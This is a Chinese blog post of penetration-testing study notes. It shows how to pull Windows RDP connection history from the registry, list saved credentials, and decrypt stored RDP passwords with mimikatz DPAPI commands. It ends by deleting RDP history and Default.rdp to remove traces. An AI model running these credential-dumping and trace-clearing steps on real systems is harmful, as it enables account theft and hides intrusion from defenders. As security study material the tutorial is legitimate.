<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>【内网渗透学习笔记】05、获取Winodws的远程连接记录 | Hui's Blog</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Hui's Blog" type="application/atom+xml">
</head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a></nav></header><main><article><div id="post-bg"><div id="post-title"><h1>【内网渗透学习笔记】05、获取Winodws的远程连接记录</h1><hr></div><div id="post-content"><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><blockquote>
<p>在使用mstsc连接的时候，管理员勾选了自动保存密码连接的选项</p>
</blockquote>
<h2 id="获得远程桌面连接历史记录"><a href="#获得远程桌面连接历史记录" class="headerlink" title="获得远程桌面连接历史记录"></a>获得远程桌面连接历史记录</h2><ul>
<li>获得当前用户的历史记录</li>
</ul>
<blockquote>
<p>注册表 <code>HKCU:\Software\Microsoft\Terminal Server Client\Servers</code></p>
</blockquote>
<p>每个注册表的项保存着连接的服务器地址，键值<code>UsernameHine</code>对应登陆用户名</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140054423.png" alt="image-20210407140054423"></p>
<h2 id="获得远程桌面连接的密码"><a href="#获得远程桌面连接的密码" class="headerlink" title="获得远程桌面连接的密码"></a>获得远程桌面连接的密码</h2><ul>
<li>查看计算机的连接记录</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list	</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140453363.png" alt="image-20210407140453363"></p>
<ul>
<li>查找本地的证书</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140601500.png" alt="image-20210407140601500"></p>
<ul>
<li>使用<code>mimikatz</code></li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\<span class="number">7</span>AAD<span class="number">155</span>F<span class="number">4888</span>E<span class="number">9</span>DB<span class="number">9</span>D<span class="number">7</span>FE<span class="number">4</span>C<span class="number">235728</span>F<span class="number">8</span>C</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140830258.png" alt="image-20210407140830258"></p>
<blockquote>
<p>把<code>guimasterkey</code>记下来</p>
</blockquote>
<ul>
<li>使用 <code>::dpapi</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407141038260.png" alt="image-20210407141038260"></p>
<blockquote>
<p>根据我们刚刚的<code>guimasterkey</code>得到<code>MasterKey</code></p>
</blockquote>
<ul>
<li>最后就可以把密码解密了</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /<span class="keyword">in</span>:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\<span class="number">7</span>AAD155F4888E9DB9D7FE4C235728F8C /masterkey:<span class="number">2</span>a1142391cf8bdacf5d93d267f0b8c8ebcf2016a37c5da0efe20b45c5a31b4f91cc4f3438af5ce969f3ac42a3d5e70b15e94df927b457a6c1647c2ce96dd4819</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142104997.png" alt="image-20210407142104997"></p>
<h2 id="从注册表中删除RDP连接缓存"><a href="#从注册表中删除RDP连接缓存" class="headerlink" title="从注册表中删除RDP连接缓存"></a>从注册表中删除RDP连接缓存</h2><ul>
<li>运行(regedit.exe)并到<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client</code> ;</li>
</ul>
<blockquote>
<p>需要删除两个注册表项：<code>默认</code>（存储的最近10个RDP连接记录）和服务器(包含所有用于登陆的RDP服务器和用户名列表)</p>
</blockquote>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142745267.png" alt="image-20210407142745267"></p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142834238.png" alt="image-20210407142834238"></p>
<blockquote>
<p>为了清除所有RDP连接和保存的用户名历史记录，必须清除服务器注册表项的内容。删除整个Servers然后重新创建。</p>
</blockquote>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142952206.png" alt="image-20210407142952206"></p>
<ul>
<li>最后把默认的RDP连接文件（包含最新的RDP会话信息）删除- <code>Default.rdp</code></li>
</ul>
<blockquote>
<p>默认在Document目录中隐藏起来</p>
</blockquote>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407143207075.png" alt="image-20210407143207075"></p>
<blockquote>
<p>删除</p>
</blockquote>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407143445878.png" alt="image-20210407143445878"></p>
<div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/04/05/intranet04/">【内网渗透学习笔记】04、代理与端口转发 Next →</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">≡</a><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
 el: '#Valine'
 , appId: ''
 , appKey: ''
 , placeholder: '此条评论委托企鹅物流发送'
})</script></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/"> Dr.Hui</a></h1><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">15</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">20</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">6</span></div></section></div><div id="aside-block"></div><footer><nobr><span class="text-title">©</span><span class="text-content">1970 to 2020</span></nobr><wbr><nobr><span class="text-title">ICP</span><span class="text-content">——备案号——</span></nobr><wbr><wbr><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html>